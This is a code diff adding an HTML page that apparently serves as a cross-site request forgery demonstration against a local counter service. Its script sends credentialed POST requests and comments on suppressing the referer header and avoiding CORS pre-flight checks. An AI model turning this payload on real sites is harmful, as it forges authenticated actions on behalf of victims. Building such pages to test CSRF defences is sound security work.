@@ -1,0 +1,24 @@
+<html lang="en">
+<head>
+    <meta name="referrer" content="no-referrer"> <!-- Do not send a referer header with the hope that it might bypass referer validation -->
+</head>
+<script>
+    const ENDPOINT='http://localhost:8080/counter'
+
+    fetch(ENDPOINT, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+            // "Content-Type": "application/json" // this triggers a pre-flight check
+        },
+        credentials: "include",
+        body: "value=1000"
+    }).catch(reason => console.error(reason))
+
+    // try the same with an XMLHttpRequest
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', ENDPOINT, true);
+    xhr.withCredentials = true;
+    xhr.send("value=1000");
+</script>
+</html>
